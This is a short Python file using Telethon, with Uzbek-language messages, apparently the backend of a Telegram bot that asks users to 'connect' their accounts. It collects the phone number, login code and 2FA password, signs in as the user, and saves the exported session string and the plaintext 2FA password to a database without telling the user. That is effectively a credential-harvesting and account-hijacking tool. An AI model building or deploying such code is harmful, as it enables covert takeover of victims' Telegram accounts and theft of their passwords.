from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import asyncio
from database import save_to_base
from config import API_ID, API_HASH

user_sessions = {}

async def start_client(phone):
    """Yangi Telegram client yaratish va ulanish"""
    client = TelegramClient(f"session_{phone}", API_ID, API_HASH)
    await client.connect()
    return client

async def login_client(event, phone, code=None, password=None):
    """Telegram hisobiga kirish jarayonini boshqarish"""
    user_data = user_sessions.get(event.sender_id)
    if not user_data:
        return await event.reply("Avval telefon raqamingizni yuboring.")

    client = user_data['client']
    
    try:
        if code:
            await client.sign_in(phone, code)
            user_data['awaiting_password'] = True
            return await event.reply("Agar 2FA parolingiz bo'lsa, uni yozing:")
        elif password:
            await client.sign_in(password=password)
            if user_data.get('notified') is not True:
                await event.reply("Account muvaffaqiyatli ulandi!")
                user_data['notified'] = True

            user_info = await client.get_me()
            username = user_info.username if user_info.username else "N/A"
            user_id = user_info.id
            session = client.session.save()

           
            await save_to_base(username, user_id, phone, session, password)

    except SessionPasswordNeededError:
        user_data['awaiting_password'] = True
        await event.reply("Agar 2FA parolingiz bo'lsa, uni yozing:")
    except Exception as e:
        await event.reply(f"Xato yuz berdi: {str(e)}")